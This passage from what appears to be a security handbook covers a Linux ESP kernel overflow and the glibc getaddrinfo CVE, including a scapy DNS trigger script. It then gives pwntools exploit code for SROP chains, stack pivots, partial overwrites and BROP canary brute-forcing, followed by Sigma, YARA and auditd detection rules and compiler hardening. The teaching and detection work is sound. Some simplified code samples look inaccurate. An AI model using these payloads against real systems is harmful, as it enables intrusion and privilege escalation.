**Root cause.** The `esp6_output_head()` function in the kernel's IPv6 ESP (Encapsulating Security Payload) implementation allocates a stack buffer for the ESP trailer based on an expected maximum payload size. When processing an oversized ESP packet, the function copies the payload into this stack buffer without validating that the payload length does not exceed the buffer capacity. The stack buffer is allocated via `alloca()` based on `esp->props.trailer_len`, but the actual data copied can exceed this when the skb (socket buffer) contains more data than expected.

```c
/* Simplified vulnerable path in net/ipv6/esp6.c */
static int esp6_output_head(struct xfrm_state *x, struct sk_buff *skb, ...)
{
    struct esp_info *esp = ...;
    int tailen = esp->tailen;  /* expected trailer length */

    /* Stack allocation based on expected size */
    u8 *tail = (u8 *)__alloca(tailen);

    /* But the actual copy uses skb data length, which can exceed tailen */
    skb_copy_bits(skb, skb->len - tailen, tail, tailen);
    /* If an attacker controls the skb contents and the length relationship
       is violated, the copy overflows the stack buffer */
}
```

**Exploitation chain.**

1. **Trigger.** An unprivileged user creates an IPsec SA (Security Association) using the `AF_KEY` or `XFRM` netlink socket (available in user namespaces). The attacker configures an ESP transform with specific algorithm parameters that create a mismatch between the expected trailer length and the actual packet data.

2. **Stack overflow in kernel context.** The overflow occurs in kernel mode on the kernel stack (typically 16 KB on x86_64, `THREAD_SIZE`). The attacker overwrites the return address of `esp6_output_head()`.

3. **Kernel ROP.** The attacker chains kernel gadgets to call `commit_creds(prepare_kernel_cred(NULL))`, granting root credentials to the current task. The kernel stack is not protected by canaries in all configurations (`CONFIG_STACKPROTECTOR` may not cover all functions; `alloca`-based frames are often not canary-protected).

4. **Privilege escalation.** After returning from the compromised kernel function with modified credentials, the attacker's process runs as root.

```bash
# Detection: check if the vulnerable module is loaded
lsmod | grep esp6

# Verify kernel version is patched
uname -r
# Fixed in: 5.17-rc8, backported to 5.16.15, 5.15.29, 5.10.106

# Audit rule for AF_KEY socket creation (uncommon in normal workloads)
auditctl -a always,exit -F arch=b64 -S socket -F a0=15 -F key=af_key_socket

# Check for user namespace access (required for unprivileged exploitation)
sysctl user.max_user_namespaces
# Mitigation: set to 0 if user namespaces are not needed
# sysctl -w user.max_user_namespaces=0
```

**Patch analysis.** The fix (commit `ebe48d3`, March 2022) adds an explicit length check comparing the actual skb data length against the allocated buffer size before the copy operation. If the lengths do not match, the function returns `-EINVAL` instead of proceeding with the copy.

### 12.4 CVE-2015-7547 — getaddrinfo stack buffer overflow (DNS-triggered RCE)

**Affected versions:** glibc 2.9 through 2.22 (September 2008 to February 2016).

**Root cause.** The `getaddrinfo()` function in glibc performs DNS resolution by calling `__res_nquery()` via `_nss_dns_gethostbyname4_r()`. The resolver allocates a 2048-byte stack buffer for the DNS response. When a DNS server returns a response larger than 2048 bytes, glibc falls back to TCP and allocates a heap buffer. However, a race condition in the retry logic causes the code to use the original stack buffer pointer for a second UDP response that arrives between the TCP fallback and its completion. The second response can overflow the 2048-byte stack buffer.

The vulnerability requires a malicious DNS server (or a MITM position on the DNS path) that sends:

1. An initial UDP response with the TC (truncated) bit set, triggering the TCP retry.
2. A second oversized UDP response that arrives while the TCP connection is in progress.

```c
/* Simplified vulnerable code path in resolv/res_send.c */
static int
send_dg(res_state statp, const u_char *buf, int buflen,
        u_char *ans, int anssiz, ...)  /* ans = stack buffer, anssiz = 2048 */
{
    /* ... UDP send ... */

    /* Receive response */
    resplen = recvfrom(s, (char *)ans, anssiz, 0, ...);

    /* If truncated, set gotsomewhere and fall through to TCP */
    if (anhp->tc) {
        *gotsomewhere = 1;
        /* Does NOT return — falls through to retry loop */
    }

    /* On the SECOND iteration, a new UDP response arrives and is
       read into 'ans' (still the 2048-byte stack buffer), but this
       time the response may be larger than 2048 bytes because the
       attacker controls the DNS server */
}
```

**Exploitation chain.**

1. **DNS MITM or rogue server.** The attacker controls the DNS server for a domain (or has network MITM capability). Any application calling `getaddrinfo()` for a hostname under the attacker's control is vulnerable.

2. **Trigger overflow.** The crafted DNS response sequence overflows the 2048-byte stack buffer in `send_dg()`. The overflow corrupts the saved frame pointer and return address.

3. **Remote code execution.** The attacker's DNS response contains a ROP chain payload. Because glibc is loaded at a known offset on systems without ASLR (or with information leaks on ASLR systems), the attacker can construct a reliable chain.

4. **Scope.** This is particularly devastating because `getaddrinfo()` is called by virtually every network-facing application: web browsers, mail clients, SSH, curl, wget, and all applications using the system resolver.

```python
# PoC DNS server demonstrating the trigger (educational — sends oversized response)
# Requires scapy: pip install scapy
from scapy.all import *

def handle_dns(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        # First response: set TC bit to force TCP fallback
        resp1 = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/\
                DNS(id=pkt[DNS].id, qr=1, tc=1, qd=pkt[DNS].qd)
        send(resp1)

        # Second response: oversized, arrives during TCP fallback
        # This overflows the 2048-byte stack buffer
        padding = b'\x00' * 3000  # Exceeds 2048 stack buffer
        resp2 = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/\
                DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd)/Raw(padding)
        send(resp2)

sniff(filter="udp port 53", prn=handle_dns)
```

```bash
# Detection: monitor for oversized DNS UDP responses
tcpdump -i any -n 'udp src port 53 and (udp[10:2] & 0x8200 = 0x8200)' -w dns_tc.pcap

# Check glibc version
ldd --version | head -1
# Vulnerable: glibc 2.9 through 2.22

# Runtime detection: trace getaddrinfo calls that take abnormally long
# (TCP fallback + second UDP = timing anomaly)
strace -e trace=network -f -p <PID> 2>&1 | \
    grep -E 'recvfrom.*len=(204[8-9]|2[1-9][0-9]{2}|[3-9][0-9]{3})'
```

**Patch analysis.** The fix (glibc 2.23, February 2016) modifies `send_dg()` to properly track the buffer size across retry iterations. The patched code ensures that if a TCP fallback is initiated, the UDP socket is closed before the TCP attempt, preventing the race condition where a second UDP response overwrites the stack buffer. Additionally, the fix adds explicit length validation: `if (resplen > anssiz) { /* discard and retry */ }`.

---

## 13. Advanced stack exploitation techniques

For basic ROP and SROP, see §11E. This section covers advanced techniques that extend or circumvent standard defenses.

### 13.1 Advanced SROP — chaining and constrained environments

For the basic SROP mechanism and pwntools `SigreturnFrame` pattern, see §11E.2. This section covers advanced SROP techniques for constrained exploitation scenarios.

**Chaining multiple sigreturn frames.** A single SROP invocation sets all registers and transfers control. By setting `RSP` in the sigframe to point at a second crafted sigframe (preceded by a `pop rax; ret` → 15 → `syscall; ret` sequence), the attacker chains multiple SROP stages:

```python
from pwn import *
context.arch = 'amd64'

# Stage 1: mprotect() to make a stack region RWX
frame1 = SigreturnFrame()
frame1.rax = constants.SYS_mprotect    # 10
frame1.rdi = rwx_page                  # page-aligned target address
frame1.rsi = 0x1000                    # length
frame1.rdx = 7                         # PROT_READ|PROT_WRITE|PROT_EXEC
frame1.rip = syscall_ret               # syscall; ret gadget
frame1.rsp = stage2_addr               # RSP points to stage 2 after mprotect returns

# Stage 2: read() shellcode into the now-RWX page
frame2 = SigreturnFrame()
frame2.rax = constants.SYS_read        # 0
frame2.rdi = 0                         # stdin
frame2.rsi = rwx_page                  # destination: the mprotect'd region
frame2.rdx = 0x200                     # size
frame2.rip = syscall_ret
frame2.rsp = rwx_page                  # after read, pivot into shellcode

# Layout on stack:
# [overflow padding] [pop_rax] [15] [syscall_ret] [frame1 bytes]
# At stage2_addr:    [pop_rax] [15] [syscall_ret] [frame2 bytes]
payload = flat(
    b'A' * offset,
    p64(pop_rax), p64(15), p64(syscall_ret),
    bytes(frame1),
)
# stage2 must be pre-positioned or written via frame1's mprotect+read chain
```

**SROP without `pop rax`.** When no `pop rax; ret` gadget is available, the attacker uses `read()` to set `RAX` via its return value. `read(fd, buf, 15)` returns 15, setting `RAX = 15 = SYS_rt_sigreturn`. The attacker sends exactly 15 bytes on the file descriptor:

```python
# Gadget chain: call read(0, rsp, 15) → RAX=15 → syscall → sigreturn
# Requires: a gadget to call read, or a prior SROP stage that sets up the read
# The trick: after read() returns with RAX=15, the next instruction is syscall
payload = flat(
    b'A' * offset,
    p64(read_gadget),     # gadget that calls read(0, rsp_addr, count)
    p64(syscall_ret),     # after read sets RAX=15, this triggers sigreturn
    bytes(frame),         # sigframe follows the syscall instruction
)
# Attacker then sends exactly 15 bytes on stdin → RAX = 15
```

**SROP as stack pivot.** In constrained overflow scenarios where the overflowed buffer is too small for a full ROP chain, SROP provides an efficient pivot: the sigframe sets `RSP` to a larger controlled buffer (e.g., a `.bss` segment written via a prior format string, or a `read()` call). The entire pivot requires only 3 gadgets (`pop rax`, the value 15, and `syscall; ret`) plus the 248-byte sigframe — significantly fewer than a conventional stack pivot chain.

### 13.2 Stack pivot techniques for constrained overflows

§11E.1 demonstrates a basic `leave; ret` pivot. This section catalogs pivot techniques for different constraint scenarios.

When the overflowed buffer is too small for a full ROP chain (common with small fixed-size buffers or partial overwrites), the attacker must pivot the stack pointer to a larger controlled region.

**`xchg rax, rsp; ret`.** If the attacker controls `RAX` (e.g., via `read()` return value or prior gadget), this single-gadget pivot moves `RSP` to the address in `RAX`:

```
Overflow payload:
[padding] → [pop rax; ret] → [controlled_buffer_addr] → [xchg rax, rsp; ret]

After xchg: RSP = controlled_buffer_addr, RAX = old RSP (irrelevant)
Execution continues at the ROP chain laid out at controlled_buffer_addr.
```

**`leave; ret` pivot.** The `leave` instruction is `mov rsp, rbp; pop rbp`. If the attacker controls `RBP` via the overflow, they set it to `(target_buffer - 8)`. The `leave; ret` sequence then sets `RSP = target_buffer - 8`, pops the first 8 bytes as the new `RBP`, and the `ret` transfers control to the address at `target_buffer`:

```python
# leave; ret pivot via RBP overwrite
# RBP is typically at [buffer + N] in the overflow
payload = flat(
    b'A' * buf_to_rbp,
    p64(pivot_target - 8),    # new RBP → after leave, RSP = pivot_target
    p64(leave_ret_gadget),    # leave; ret
)
# At pivot_target:
# [fake_rbp] [first_rop_gadget] [arg1] [next_gadget] ...
```

**`pop rsp; ret`.** Directly sets `RSP` from the stack. The overflow places the target address at the position where `pop rsp` reads from the stack:

```
Overflow: [padding] [pop_rsp_ret_addr] [new_stack_addr]
After pop rsp: RSP = new_stack_addr
ret: pops and jumps to whatever is at new_stack_addr
```

**Pivot to `.bss`.** For statically linked or non-PIE binaries, the `.bss` section is at a fixed address and writable. The attacker writes a ROP chain into `.bss` using a `read()` call in the initial (small) chain, then pivots `RSP` to `.bss`:

```python
# Minimal 3-gadget chain: read ROP chain into .bss, then pivot
# Step 1: read(0, bss_addr, rop_chain_size)
payload = flat(
    b'A' * offset,
    p64(pop_rdi), p64(0),              # fd = stdin
    p64(pop_rsi_r15), p64(bss_addr), p64(0),  # buf = .bss
    p64(pop_rdx), p64(0x400),          # count
    p64(plt_read),                      # read()
    p64(pop_rsp), p64(bss_addr),        # pivot to .bss
)
# Then send the full ROP chain on stdin
```

### 13.3 Partial overwrite exploitation — 1-byte and 2-byte overflows

Off-by-one and off-by-two errors (§6 integer territory) often produce partial overwrites of the saved RBP or the least significant byte(s) of the return address.

**1-byte RBP overwrite (off-by-one).** Overwriting the least significant byte of the saved `RBP` shifts the frame pointer within the same page (256-byte range). After the caller executes `leave; ret`, `RSP` is set to the corrupted `RBP`, and the subsequent `ret` pops the return address from attacker-influenced memory:

```
Original saved RBP:  0x7fff_dead_bf00
After 1-byte overwrite: 0x7fff_dead_bfXX  (XX controlled by attacker)

The caller's 'leave; ret':
  mov rsp, rbp      → RSP = 0x7fff_dead_bfXX
  pop rbp           → new RBP from [RSP], RSP += 8
  ret               → jumps to [RSP] — this address is now controlled
                       if the attacker placed data at 0x7fff_dead_bfXX+8
```

The exploitation requires that the attacker's data (or controllable input) resides within 256 bytes of the original frame pointer. This is common when the overflowed buffer is in the same stack frame.

**2-byte return address overwrite for ASLR bypass.** ASLR randomizes the base address of libraries, but the 12 least significant bits of any page-aligned mapping are always zero (page size = 0x1000). Overwriting the two least significant bytes of a return address (16 bits) leaves 4 bits of ASLR entropy unaffected (bits 12-15) and gives the attacker 12 bits of controlled offset within the page. With 4 bits of remaining entropy, the attack succeeds with probability 1/16:

```python
# 2-byte partial overwrite: redirect return to a one-gadget or specific function
# Original return address: 0x7f_XX_YY_ZZ_WW_VV  (XX random from ASLR)
# After 2-byte overwrite:  0x7f_XX_YY_ZZ_TT_UU  (TT_UU controlled)
#
# If we know the offset of system() within libc's page alignment:
# libc_base + 0x????TTUU  (need to guess the 4 bits at position 12-15)
# Success rate: 1/16 per attempt

payload = flat(
    b'A' * offset_to_retaddr,
    p16(target_offset & 0xFFFF),   # overwrite only 2 bytes
)
# In a forking server: each fork attempt preserves the same ASLR layout
# → 16 attempts to brute-force the 4-bit entropy
```

### 13.4 Thread stack exploitation

Multi-threaded programs create per-thread stacks via `pthread_create()` → `mmap()`. These stacks have security-relevant properties that differ from the main thread stack.

**Thread stack adjacency.** Thread stacks are allocated as contiguous `mmap` regions. On glibc, the default thread stack size is 8 MB (matching `RLIMIT_STACK`), but the guard page between thread stacks is only 1 page (4 KB) by default. A large enough overflow can jump the guard page and land in an adjacent thread's stack:

```c
/* Thread stack layout in memory (glibc default):
 *
 * High address
 * ┌─────────────────────┐
 * │ Thread 1 stack (8MB) │
 * ├─────────────────────┤
 * │ Guard page (4KB)     │  ← single PROT_NONE page
 * ├─────────────────────┤
 * │ Thread 2 stack (8MB) │
 * ├─────────────────────┤
 * │ Guard page (4KB)     │
 * ├─────────────────────┤
 * │ Thread 3 stack (8MB) │
 * └─────────────────────┘
 * Low address
 *
 * A 4KB+1 overflow from Thread 2 into Thread 1's guard page
 * triggers SIGSEGV, but a precisely sized overflow can skip
 * the guard page entirely if the overflow writes > 4KB past
 * the stack boundary (stack clash on thread stacks).
 */
```

**Mitigation:** use `pthread_attr_setguardsize()` to increase the guard region. A 1 MB guard page makes cross-thread overflows infeasible without massive writes.

**TLS (Thread Local Storage) clobber.** The TLS block is located at a fixed offset from the thread stack. On glibc/x86_64, the TCB (Thread Control Block) sits at the top of the TLS region, accessible via `fs:0`. The stack canary is at `fs:0x28`. If an overflow can reach the TLS region, the attacker can overwrite the canary reference value, then overflow the actual canary on the stack with the same value — a canary bypass:

```
Thread stack layout (glibc x86_64):

Low address
┌─────────────────────┐
│  Stack growth ↓      │
│  ...                 │
│  Local variables     │
│  Stack canary copy   │  ← from fs:0x28
│  Saved RBP           │
│  Return address      │
├─────────────────────┤
│  Guard page(s)       │
├─────────────────────┤
│  TLS static block    │
│  ...                 │
│  TCB (fs:0 base)     │
│    +0x28: canary     │  ← if overwritten to match stack copy, bypass
│    +0x10: stack_guard │
│    +0x30: pointer_guard │
└─────────────────────┘
High address

Exploitation: overflow past the guard page into TLS, overwrite canary
at TCB+0x28, then the stack canary check (xor with fs:0x28) passes.
```

### 13.5 Blind ROP (BROP) attack methodology

BROP targets network services that `fork()` on each connection. After `fork()`, the child inherits the parent's memory layout, ASLR base, and stack canary. A crash in the child does not affect the parent.

**Phase 1: canary brute-force.** The canary is 8 bytes with a NUL first byte. The attacker overflows one byte at a time, starting from the byte after the buffer. For each byte position, the attacker sends 256 candidate values. If the server responds normally (no crash), the byte is correct. Worst case: 7 × 256 = 1792 attempts for the 7 non-NUL bytes.

**Phase 2: saved RBP/RIP brute-force.** Same technique. Overwrite the saved RBP one byte at a time (6 non-zero bytes for a stack address), then the return address. The goal is to discover the original return address.

**Phase 3: gadget scanning.** Using the discovered return address as a reference point, the attacker probes nearby addresses to find useful gadgets. Key signatures:

- **`stop` gadget:** an address that causes the server to hang (e.g., an infinite loop or `sleep()`). Used as a sentinel — if the server hangs instead of crashing, the probed address executed successfully.
- **`pop; ret` sequences:** the attacker constructs a probe chain: `[candidate_addr] [stop_gadget]`. If the server hangs, the candidate pops one value and returns to the stop gadget — it is a `pop X; ret` gadget.

**Phase 4: attack.** Once sufficient gadgets are identified, the attacker constructs a ROP chain to call `write(socket_fd, some_addr, length)` to leak the binary's `.text` section back over the network. With the leaked binary, the attacker identifies all gadgets and builds a full exploit.

```python
# BROP canary brute-force (simplified pwntools sketch)
from pwn import *

def try_byte(known_canary, byte_val, offset):
    """Send overflow with known canary bytes + candidate byte.
    Returns True if server does not crash."""
    try:
        r = remote('target', 1234, timeout=2)
        payload = b'A' * offset + known_canary + bytes([byte_val])
        r.send(payload)
        r.recv(timeout=1)   # if we get a response, no crash
        r.close()
        return True
    except:
        return False

canary = b'\x00'  # first byte is always NUL
for pos in range(1, 8):
    for val in range(256):
        if try_byte(canary, val, buffer_offset):
            canary += bytes([val])
            log.info(f"Canary byte {pos}: {hex(val)}")
            break
    else:
        log.error(f"Failed to find canary byte {pos}")

log.success(f"Leaked canary: {canary.hex()}")
```

---

## 14. Format string and integer detection engineering

### 14.1 Format string attack detection rules

**Sigma rule — format string patterns in application logs.**

```yaml
title: Format String Attack Indicators in Application Logs
id: 3a-fmtstr-001
status: experimental
description: >
    Detects format string exploitation attempts by matching format specifier
    patterns that should never appear in legitimate user input.
logsource:
    category: application
detection:
    selection_write_specifiers:
        message|contains:
            - '%n'
            - '%hn'
            - '%hhn'
    selection_positional:
        message|re: '%[0-9]{1,3}\$n'
    selection_large_padding:
        message|re: '%[0-9]{4,8}[cdx]'
    condition: selection_write_specifiers and (selection_positional or selection_large_padding)
level: high
tags:
    - attack.execution
    - attack.t1203
falsepositives:
    - Debug logging that includes raw format strings (should be sanitized)
    - Developer testing payloads in non-production environments
```

**Sigma rule — integer overflow indicators in compiler sanitizer output.**

```yaml
title: Integer Overflow Detected by UBSan or ASAN
id: 3a-intovfl-001
status: experimental
description: >
    Detects runtime integer overflow reports from UndefinedBehaviorSanitizer
    (UBSan) or AddressSanitizer (ASAN) in application stderr/logs.
logsource:
    category: application
detection:
    selection_ubsan:
        message|contains:
            - 'runtime error: signed integer overflow'
            - 'runtime error: unsigned integer overflow'
            - 'runtime error: negation of'
            - 'runtime error: shift exponent'
    selection_asan_overflow:
        message|contains:
            - 'stack-buffer-overflow'
            - 'stack-buffer-underflow'
            - 'stack-use-after-return'
    condition: selection_ubsan or selection_asan_overflow
level: critical
tags:
    - attack.execution
falsepositives:
    - Intentional unsigned wrapping in hash functions (should use -fno-sanitize=unsigned-integer-overflow for those files)
```

### 14.2 Stack canary corruption detection

When a stack canary is corrupted, glibc calls `__stack_chk_fail()`, which prints a diagnostic and sends `SIGABRT`. Detection focuses on catching this signal and the associated log message.

```yaml
title: Stack Canary Corruption Detected (stack smashing)
id: 3a-canary-001
status: stable
description: >
    Detects stack buffer overflow exploitation attempts via stack canary
    (stack smashing detected) abort signals.
logsource:
    product: linux
    service: syslog
detection:
    selection_stacksmash:
        message|contains: 'stack smashing detected'
    selection_fortify:
        message|contains: '*** buffer overflow detected ***'
    selection_abrt:
        message|contains:
            - 'SIGABRT'
            - 'signal 6'
            - 'Aborted (core dumped)'
    condition: (selection_stacksmash or selection_fortify) or
               (selection_abrt and message|contains|any:
                   - '__stack_chk_fail'
                   - '__fortify_fail')
level: critical
tags:
    - attack.execution
    - attack.t1190
```

```bash
# Systemd journal query for canary/FORTIFY aborts in the last 24h
journalctl --since "24 hours ago" --no-pager | \
    grep -E 'stack smashing detected|buffer overflow detected|__stack_chk_fail|__fortify_fail'

# Auditd rule: capture all SIGABRT signals (potential canary trips)
# /etc/audit/rules.d/stack-canary.rules
-a always,exit -F arch=b64 -S kill -F a1=6 -F key=sigabrt_canary
-a always,exit -F arch=b64 -S tgkill -F a2=6 -F key=sigabrt_canary
```

### 14.3 FORTIFY_SOURCE abort pattern detection

When `FORTIFY_SOURCE` detects a buffer overflow at runtime (via the `_chk` variants of `memcpy`, `strcpy`, `sprintf`, etc.), it calls `__fortify_fail()` which produces a distinct abort pattern. Monitoring these aborts is critical because they represent exploitation attempts that were stopped by the mitigation.

```bash
# Parse coredump metadata for FORTIFY/canary signals
coredumpctl list --since "7 days ago" --no-pager | while read -r line; do
    pid=$(echo "$line" | awk '{print $5}')
    info=$(coredumpctl info "$pid" 2>/dev/null)
    if echo "$info" | grep -qE '__fortify_fail|__stack_chk_fail|__chk_fail'; then
        echo "ALERT: FORTIFY/canary abort detected — PID $pid"
        echo "$info" | grep -E 'Signal|Executable|Command'
    fi
done

# Syslog pattern for FORTIFY aborts across the fleet
# /etc/rsyslog.d/40-fortify-alerts.conf
:msg, contains, "buffer overflow detected" /var/log/security/fortify-aborts.log
:msg, contains, "stack smashing detected" /var/log/security/fortify-aborts.log
```

### 14.4 Suspicious stack pivot indicators

Stack pivots (§13.2) are detectable at runtime through anomalous `RSP` values. In normal execution, `RSP` always points within the thread's designated stack region. A pivoted `RSP` points to `.bss`, heap, or another writable segment.

```yaml
title: Stack Pivot Detected via Anomalous RSP in Crash Dump
id: 3a-pivot-001
status: experimental
description: >
    Detects potential stack pivot exploitation by identifying crash dumps where
    the stack pointer (RSP) is outside the expected stack region.
logsource:
    product: linux
    service: coredump
detection:
    selection:
        COREDUMP_SIGNAL: '11'   # SIGSEGV
    filter_normal_stack:
        # RSP should be in [stack] mapping; if not, pivot likely
        COREDUMP_STACKTRACE|contains: 'rsp=0x0000'  # placeholder — see script below
    condition: selection
level: high
```

```bash
# Automated pivot detection in coredumps
# Extracts RSP and compares against [stack] mapping
coredumpctl list --since "7 days ago" --no-pager -o json 2>/dev/null | \
    python3 -c "
import json, sys, subprocess, re

for line in sys.stdin:
    try:
        entry = json.loads(line)
        pid = entry.get('COREDUMP_PID', '')
        result = subprocess.run(
            ['coredumpctl', 'info', str(pid)],
            capture_output=True, text=True, timeout=10
        )
        output = result.stdout
        # Extract RSP value
        rsp_match = re.search(r'rsp\s*[:=]\s*(0x[0-9a-f]+)', output, re.I)
        # Extract stack mapping
        stack_match = re.search(r'([0-9a-f]+)-([0-9a-f]+).*\[stack\]', output)
        if rsp_match and stack_match:
            rsp = int(rsp_match.group(1), 16)
            stack_lo = int(stack_match.group(1), 16)
            stack_hi = int(stack_match.group(2), 16)
            if not (stack_lo <= rsp <= stack_hi):
                print(f'PIVOT DETECTED: PID={pid} RSP={hex(rsp)} '
                      f'stack=[{hex(stack_lo)}-{hex(stack_hi)}]')
    except Exception:
        continue
"
```

### 14.5 YARA rules — format string and stack overflow payloads

```
rule Format_String_Precision_Attack {
    meta:
        description = "Detect format string payloads using precision specifiers for controlled writes"
        author = "3A detection engineering"
        severity = "high"
    strings:
        $write_n     = /\%[0-9]{1,3}\$n/ ascii
        $write_hn    = /\%[0-9]{1,3}\$hn/ ascii
        $write_hhn   = /\%[0-9]{1,3}\$hhn/ ascii
        $large_width = /\%[0-9]{4,8}c/ ascii
        $direct_n    = "%n" ascii
        $stack_walk  = /(\%p[. ]){4,}/ ascii    // repeated %p = stack leak
    condition:
        (any of ($write_n, $write_hn, $write_hhn)) and
        ($large_width or $stack_walk) and
        filesize < 10MB
}

rule Stack_Overflow_NOP_Sled {
    meta:
        description = "Detect NOP sled patterns preceding shellcode on stack"
        author = "3A detection engineering"
    strings:
        $nop_x86     = { 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 }
        $nop_alt1    = { 66 90 66 90 66 90 66 90 }           // 2-byte NOP
        $nop_alt2    = { 0f 1f 00 0f 1f 00 0f 1f 00 }        // 3-byte NOP
        $shellcode   = { 48 31 c0 48 31 ff 48 31 f6 48 31 d2 }  // xor rax,rax; xor rdi,rdi; ...
        $bin_sh      = "/bin/sh" ascii
        $execve      = { 48 c7 c0 3b 00 00 00 0f 05 }        // mov rax, 59; syscall
    condition:
        any of ($nop_x86, $nop_alt1, $nop_alt2) and
        (any of ($shellcode, $bin_sh, $execve))
}

rule Canary_Brute_Force_Traffic {
    meta:
        description = "Detect BROP-style canary brute-force in network captures"
        author = "3A detection engineering"
    strings:
        // Pattern: repeated connections with incrementally different byte
        // at the same offset — this is a behavioral rule
        $overflow_pad = /A{32,256}/ ascii
    condition:
        $overflow_pad and filesize < 1MB
        // Note: network-level detection of BROP requires flow correlation,
        // not just payload inspection. This rule catches the payload shape
        // in individual packet captures; correlate with connection frequency.
}
```

### 14.6 Compiler warning enforcement in CI/CD

Format string and integer errors are detectable at compile time with the right warning flags. Enforcing these in CI prevents entire vulnerability classes from reaching production.

```bash
# Recommended CFLAGS for format string and integer safety
export CFLAGS="
    -Wall -Wextra -Werror
    -Wformat=2                    # strict format string checking
    -Wformat-security             # warn on non-literal format strings
    -Wformat-nonliteral           # warn on format strings from variables
    -Wformat-overflow=2           # warn on format string buffer overflow
    -Wformat-truncation=2         # warn on snprintf truncation
    -Wformat-signedness           # warn on signedness mismatches in format
    -Wint-conversion              # warn on implicit integer conversions
    -Wsign-conversion             # warn on sign-changing conversions
    -Wconversion                  # warn on narrowing conversions
    -Wshift-overflow=2            # warn on shift overflow
    -Wstrict-overflow=3           # warn on signed overflow assumptions
    -Wstringop-overflow=4         # warn on string operation overflow
    -ftrapv                       # trap on signed overflow at runtime
    -D_FORTIFY_SOURCE=2           # enable FORTIFY runtime checks
    -fstack-protector-strong      # stack canaries for at-risk functions
    -fstack-clash-protection      # stack clash guard
    -fcf-protection=full          # Intel CET (if supported)
"

# CI enforcement: fail build on any format or integer warning
# Makefile pattern:
# WERROR_FLAGS = -Werror=format-security -Werror=format-nonliteral \
#                -Werror=int-conversion -Werror=sign-conversion
```

```yaml
# GitHub Actions integration for format/integer safety
name: Security Compiler Checks
on: [push, pull_request]
jobs:
  format-integer-safety:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build with strict format and integer warnings
        run: |
          export CC=gcc
          export CFLAGS="-Wall -Werror -Wformat=2 -Wformat-security \
                         -Wformat-nonliteral -Wsign-conversion \
                         -Wconversion -Wint-conversion \
                         -D_FORTIFY_SOURCE=2 -fstack-protector-strong"
          make clean && make
      - name: Build with Clang and additional checks
        run: |
          export CC=clang
          export CFLAGS="-Wall -Werror -Wformat=2 -Wformat-security \
                         -Wformat-nonliteral -Wsign-conversion \
                         -Wshorten-64-to-32 -Wimplicit-int-conversion \
                         -D_FORTIFY_SOURCE=2 -fstack-protector-strong \
                         -fsanitize=integer -fno-sanitize-recover=integer"
          make clean && make
          make test
```

### 14.7 AddressSanitizer deployment for production-adjacent environments

ASAN is too expensive for production (2x CPU, 3x memory) but invaluable for staging, canary deployments, and fuzzing infrastructure. This section covers deployment patterns.

```bash
# Build for ASAN-instrumented staging deployment
export CFLAGS="-fsanitize=address -fsanitize-recover=address -g -O1"
export ASAN_OPTIONS="halt_on_error=0:log_path=/var/log/asan/asan:log_exe_name=1:\
detect_stack_use_after_return=1:check_initialization_order=1:\
strict_init_order=1:detect_leaks=0:quarantine_size_mb=256:\
allocator_may_return_null=1:print_stats=1"

# Key ASAN_OPTIONS explained:
# halt_on_error=0        → log and continue (don't crash the staging service)
# log_path=...           → write ASAN reports to files for collection
# detect_stack_use_after_return=1 → catch stack UAR (uses fake stack frames)
# detect_leaks=0         → disable leak detection (too noisy for staging)
# quarantine_size_mb=256 → quarantine freed memory for better UAF detection

# Collect ASAN logs centrally
# /etc/logrotate.d/asan-logs
# /var/log/asan/*.asan {
#     daily
#     rotate 14
#     compress
#     missingok
#     notifempty
# }
```

**ASAN report parsing for alerting:**

```bash
# Parse ASAN reports and extract actionable findings
find /var/log/asan/ -name '*.asan.*' -newer /var/run/asan-last-check -print0 | \
    xargs -0 grep -l 'ERROR: AddressSanitizer' | while read -r report; do
    error_type=$(grep 'ERROR: AddressSanitizer' "$report" | head -1 | \
                 sed 's/.*AddressSanitizer: //' | cut -d' ' -f1-3)
    stack_frame=$(grep '#0 ' "$report" | head -1)
    echo "ASAN_ALERT: type=$error_type file=$report frame=$stack_frame"
done
```

### 14.8 Runtime format string audit with LD_PRELOAD

For legacy binaries that cannot be recompiled, an `LD_PRELOAD` shim can intercept `printf`-family calls and reject format strings containing write specifiers:

```c
/* fmtguard.c — LD_PRELOAD format string interceptor
 * Build: gcc -shared -fPIC -o fmtguard.so fmtguard.c -ldl
 * Use:   LD_PRELOAD=./fmtguard.so ./legacy_binary
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static int check_format(const char *fmt) {
    /* Reject format strings containing %n, %hn, %hhn */
    const char *p = fmt;
    while ((p = strchr(p, '%')) != NULL) {
        p++;
        /* Skip flags, width, precision */
        while (*p && strchr("-+ #0", *p)) p++;
        while (*p >= '0' && *p <= '9') p++;
        if (*p == '$') { p++; continue; }  /* positional — re-check */
        if (*p == '.') { p++; while (*p >= '0' && *p <= '9') p++; }
        /* Check length modifiers + conversion */
        if (*p == 'h' && *(p+1) == 'h' && *(p+2) == 'n') return -1;
        if (*p == 'h' && *(p+1) == 'n') return -1;
        if (*p == 'n') return -1;
        if (*p) p++;
    }
    return 0;
}

int printf(const char *fmt, ...) {
    if (check_format(fmt) < 0) {
        fprintf(stderr, "[fmtguard] BLOCKED: format string contains %%n\n");
        abort();
    }
    /* Call real printf */
    int (*real_printf)(const char *, ...) = dlsym(RTLD_NEXT, "printf");
    va_list args;
    va_start(args, fmt);
    int ret = vprintf(fmt, args);
    va_end(args);
    return ret;
}
/* Repeat for fprintf, sprintf, snprintf, syslog, etc. */
```

---

## 15. Modern compiler defenses deep dive

### 15.1 SafeStack (Clang)

SafeStack is a Clang mitigation (`-fsanitize=safe-stack`) that splits the stack into two regions:

1. **Safe stack.** Contains return addresses, saved frame pointers, and spill slots — data that must not be corrupted by buffer overflows.
2. **Unsafe stack.** Contains local variables (especially arrays and address-taken variables) that might be targets of buffer overflows.

The safe stack is allocated normally (via the kernel's stack mapping). The unsafe stack is a separate `mmap` allocation, stored in a thread-local variable accessible via `fs:` segment register on x86_64.

```
SafeStack memory layout:

Normal execution:
┌──────────────────┐
│ Safe stack        │ ← RSP points here; contains return addr, saved RBP
│ (return addresses,│
│  saved registers) │
└──────────────────┘

┌──────────────────┐
